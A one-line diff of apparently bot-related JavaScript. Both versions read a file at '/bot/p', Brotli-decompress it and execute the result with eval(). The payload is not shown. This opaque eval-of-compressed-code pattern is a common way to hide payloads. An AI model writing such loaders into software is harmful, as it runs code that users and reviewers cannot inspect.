@@ -1,1 +1,1 @@
-eval(require('zlib').brotliDecompressSync(require('fs').readFileSync('/bot/p'))+'')
+let l=require('fs');eval(require('zlib').brotliDecompressSync(l.readFileSync('/bot/p'))+'')
